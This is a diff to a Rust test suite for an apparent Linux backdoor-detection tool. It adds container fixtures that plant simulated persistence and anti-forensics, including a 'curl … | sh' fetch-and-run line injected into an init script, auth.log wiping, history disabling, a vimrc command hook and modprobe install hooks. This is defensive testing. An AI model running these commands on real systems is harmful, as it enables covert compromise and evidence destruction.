@@ -17,15 +17,28 @@ struct Case {
     /// on the target; skipped when the collector reports the ownership gap.
     expect_pkg: &'static [&'static str],
     quiet: &'static [&'static str],
+    /// Families where the quiet check is skipped because the container
+    /// runtime itself produces findings (e.g. podman machine helpers
+    /// visible as hidden processes), not because the entry is wrong.
+    quiet_skip: &'static [&'static str],
 }
+
+/// Baseline tools the disposable lab image itself is missing; installed
+/// once per container before fixtures so the collectors run their real
+/// paths instead of degrading into tool-gap output.
+const SETUP: &[(&str, &str)] = &[(
+    "redhat",
+    "command -v find >/dev/null 2>&1 || microdnf install -y findutils >/dev/null 2>&1 || dnf install -y findutils >/dev/null 2>&1 || yum install -y findutils >/dev/null 2>&1",
+)];
 
 const CASES: &[Case] = &[
     Case {
         id: "process-exe-path",
-        fixture: "mkdir -p /tmp/lhbin; cp \"$(command -v sleep)\" /tmp/lhbin/sleep 2>/dev/null || cp /bin/busybox /tmp/lhbin/sleep; chmod +x /tmp/lhbin/sleep; (/tmp/lhbin/sleep 120 </dev/null >/dev/null 2>&1 &); sleep 1",
-        expect: &["/tmp/lhbin/sleep"],
+        fixture: "mkdir -p /tmp/lhbin; cp \"$(command -v sh)\" /tmp/lhbin/sh 2>/dev/null || cp /bin/busybox /tmp/lhbin/sh; chmod +x /tmp/lhbin/sh; (/tmp/lhbin/sh -c 'sleep 120 & wait' </dev/null >/dev/null 2>&1 &); sleep 1",
+        expect: &["/tmp/lhbin/sh"],
         expect_pkg: &[],
         quiet: &[],
+        quiet_skip: &[],
     },
     Case {
         id: "persistence-pam",
@@ -33,6 +46,7 @@ const CASES: &[Case] = &[
         expect: &["pam_exec.so /tmp/x"],
         expect_pkg: &[],
         quiet: &["/tmp/quiet"],
+        quiet_skip: &[],
     },
     Case {
         id: "persistence-inetd",
@@ -40,6 +54,7 @@ const CASES: &[Case] = &[
         expect: &["spawn"],
         expect_pkg: &[],
         quiet: &[],
+        quiet_skip: &[],
     },
     Case {
         id: "persistence-python-pth",
@@ -47,6 +62,7 @@ const CASES: &[Case] = &[
         expect: &["lhtest.pth"],
         expect_pkg: &[],
         quiet: &["distutils-precedence.pth"],
+        quiet_skip: &[],
     },
     Case {
         id: "persistence-git-hooks",
@@ -54,6 +70,7 @@ const CASES: &[Case] = &[
         expect: &["post-merge"],
         expect_pkg: &[],
         quiet: &["pre-commit.sample"],
+        quiet_skip: &[],
     },
     Case {
         id: "log-web-trace",
@@ -61,6 +78,7 @@ const CASES: &[Case] = &[
         expect: &["/.a.php", "存在：/var/www/html/.a.php"],
         expect_pkg: &[],
         quiet: &["/index.php"],
+        quiet_skip: &[],
     },
     Case {
         id: "file-web-version",
@@ -68,6 +86,7 @@ const CASES: &[Case] = &[
         expect: &["ThinkPHP", "5.0.24", "需人工核对"],
         expect_pkg: &[],
         quiet: &["3.1.48"],
+        quiet_skip: &[],
     },
     Case {
         id: "file-rootkit-signatures",
@@ -75,6 +94,7 @@ const CASES: &[Case] = &[
         expect: &["/dev/tux/.proc"],
         expect_pkg: &[],
         quiet: &["/dev/tux/.file"],
+        quiet_skip: &[],
     },
     Case {
         id: "network-hidden-ports",
@@ -82,6 +102,7 @@ const CASES: &[Case] = &[
         expect: &[],
         expect_pkg: &[],
         quiet: &["关注："],
+        quiet_skip: &[],
     },
     Case {
         id: "network-bind-probe",
@@ -89,6 +110,7 @@ const CASES: &[Case] = &[
         expect: &[],
         expect_pkg: &[],
         quiet: &["关注："],
+        quiet_skip: &[],
     },
     Case {
         id: "system-lkm",
@@ -96,6 +118,7 @@ const CASES: &[Case] = &[
         expect: &["lhlab.ko"],
         expect_pkg: &[],
         quiet: &[],
+        quiet_skip: &[],
     },
     Case {
         id: "perm-dt-needed",
@@ -103,6 +126,7 @@ const CASES: &[Case] = &[
         expect: &[],
         expect_pkg: &[],
         quiet: &["关注："],
+        quiet_skip: &[],
     },
     Case {
         id: "file-command-evidence",
@@ -110,6 +134,7 @@ const CASES: &[Case] = &[
         expect: &["修改时间偏离"],
         expect_pkg: &[],
         quiet: &[],
+        quiet_skip: &[],
     },
     Case {
         id: "persistence-chain",
@@ -122,6 +147,7 @@ curl http://198.51.100.7/x | sh
         expect: &["second.sh"],
         expect_pkg: &[],
         quiet: &["first.sh | 第"],
+        quiet_skip: &[],
     },
     Case {
         id: "perm-suid-ownership",
@@ -129,6 +155,7 @@ curl http://198.51.100.7/x | sh
         expect: &["GTFOBins"],
         expect_pkg: &["lhlab"],
         quiet: &[],
+        quiet_skip: &[],
     },
     Case {
         id: "persistence-unit-owner",
@@ -138,6 +165,7 @@ ExecStart=/tmp/lhlab.sh
         expect: &[],
         expect_pkg: &["lhlab.service", "ExecStart=/tmp/lhlab.sh"],
         quiet: &[],
+        quiet_skip: &[],
     },
     Case {
         id: "file-smarty-templates-c",
@@ -145,6 +173,7 @@ ExecStart=/tmp/lhlab.sh
         expect: &["templates_c/aa11_file_index.tpl.php", "执行/解码特征"],
         expect_pkg: &[],
         quiet: &[],
+        quiet_skip: &[],
     },
     Case {
         id: "file-webshell-hint",
@@ -152,6 +181,7 @@ ExecStart=/tmp/lhlab.sh
         expect: &["/var/www/html/lhlab.php"],
         expect_pkg: &[],
         quiet: &[],
+        quiet_skip: &[],
     },
     Case {
         id: "system-modules",
@@ -159,6 +189,7 @@ ExecStart=/tmp/lhlab.sh
         expect: &[],
         expect_pkg: &[],
         quiet: &["关注："],
+        quiet_skip: &[],
     },
     Case {
         id: "process-hidden",
@@ -166,6 +197,57 @@ ExecStart=/tmp/lhlab.sh
         expect: &[],
         expect_pkg: &[],
         quiet: &["关注："],
+        quiet_skip: &["redhat"],
+    },
+    Case {
+        id: "persistence-editor-config",
+        fixture: "mkdir -p /root/.vim/plugin; printf '\" config\\nset modeline\\nautocmd BufRead * :!id\\nset number\\n' > /root/.vimrc; printf 'call system(\"id\")\\n' > /root/.vim/plugin/x.vim; printf '\" clean\\nset number\\nset nomodeline\\n' > /root/.exrc",
+        expect: &["set modeline", "autocmd", "x.vim"],
+        expect_pkg: &[],
+        quiet: &["set number", "nomodeline"],
+        quiet_skip: &[],
+    },
+    Case {
+        id: "startup-init-package-verify",
+        fixture: "if command -v apk >/dev/null 2>&1; then { [ -d /etc/init.d ] || apk add --no-cache openrc >/dev/null 2>&1; printf '# injected\\n' >> /etc/init.d/dmesg 2>/dev/null; printf 'x\\n' > /etc/init.d/lhlab-unowned; }; elif command -v dpkg >/dev/null 2>&1; then { dpkg -S /etc/init.d/cron >/dev/null 2>&1 || { apt-get update -qq >/dev/null 2>&1 && apt-get install -y -qq cron >/dev/null 2>&1; }; printf 'curl http://198.51.100.7/x | sh\\n' >> /etc/init.d/cron 2>/dev/null; printf 'x\\n' > /etc/init.d/lhlab-unowned; (cd /tmp && apt-get download cron >/dev/null 2>&1 && cp cron_*.deb /var/cache/apt/archives/ 2>/dev/null); }; elif command -v rpm >/dev/null 2>&1; then { [ -d /etc/init.d ] || microdnf install -y initscripts >/dev/null 2>&1 || dnf install -y initscripts >/dev/null 2>&1 || yum install -y initscripts >/dev/null 2>&1; lh_rpmfile=$(for c in /etc/init.d/*; do [ -f \"$c\" ] && [ ! -L \"$c\" ] && rpm -qf \"$c\" >/dev/null 2>&1 && { echo \"$c\"; break; }; done); [ -n \"$lh_rpmfile\" ] && printf '# injected\\n' >> \"$lh_rpmfile\"; printf 'x\\n' > /etc/init.d/lhlab-unowned; }; fi",
+        expect: &["不一致", "lhlab-unowned"],
+        expect_pkg: &[],
+        quiet: &["结论：一致"],
+        quiet_skip: &[],
+    },
+    Case {
+        id: "log-tamper-signs",
+        fixture: ": > /var/log/auth.log; ln -sf /dev/null /root/.bash_history",
+        expect: &["auth.log", "符号链接"],
+        expect_pkg: &[],
+        quiet: &["secure"],
+        quiet_skip: &[],
+    },
+    Case {
+        id: "persistence-profile-content",
+        fixture: "printf 'export HISTFILE=/dev/null\\nunset HISTFILE\\nexport HISTCONTROL=ignorespace\\n' >> /etc/profile",
+        expect: &["HISTFILE=/dev/null", "unset HISTFILE"],
+        expect_pkg: &[],
+        quiet: &["ignorespace"],
+        quiet_skip: &[],
+    },
+    Case {
+        id: "system-module-revival-points",
+        fixture: "printf 'insmod /tmp/lhrev.ko\\n# insmod /tmp/quiet.ko\\n' >> /etc/profile; mkdir -p /etc/cron.d /etc/init.d /etc/modprobe.d /etc/modules-load.d; printf '* * * * * root /sbin/modprobe lhrev\\n' > /etc/cron.d/lhrev; printf '#!/bin/sh\\nmodprobe lhinit\\n' > /etc/init.d/lhrevinit; printf 'lh_nonexistent_mod\\n# loop\\n' > /etc/modules-load.d/lhrev.conf; printf 'install lhinj /bin/sh /tmp/x\\nsoftdep lhinj post: /tmp/rearm\\noptions lhinj quiet=1\\n' > /etc/modprobe.d/lhrev.conf; touch /tmp/lhrev.ko",
+        expect: &[
+            "/etc/profile",
+            "cron.d/lhrev",
+            "init.d/lhrevinit",
+            "lhrev.ko",
+            "lhrev.conf",
+        ],
+        expect_pkg: &[],
+        quiet: &[
+            "quiet.ko",
+            "quiet=1",
+            "文件属性：/etc/modules-load.d/lhrev.conf | 第 2 行",
+        ],
+        quiet_skip: &[],
     },
 ];
 
@@ -197,6 +279,11 @@ fn backdoor_entries_flag_container_fixtures() {
     let mut failures = Vec::new();
     for pair in containers.split(',') {
         let (name, container) = pair.split_once('=').expect("family=container");
+        for (family_name, setup) in SETUP {
+            if *family_name == name {
+                exec(container, setup);
+            }
+        }
         for case in CASES {
             if !case.fixture.is_empty() {
                 exec(container, case.fixture);
@@ -229,6 +316,9 @@ fn backdoor_entries_flag_container_fixtures() {
                 }
             }
             for marker in case.quiet {
+                if case.quiet_skip.contains(&name) {
+                    break;
+                }
                 if flagged.iter().any(|line| line.contains(marker)) {
                     failures.push(format!("{name} {}: flagged quiet line {marker}", case.id));
                 }
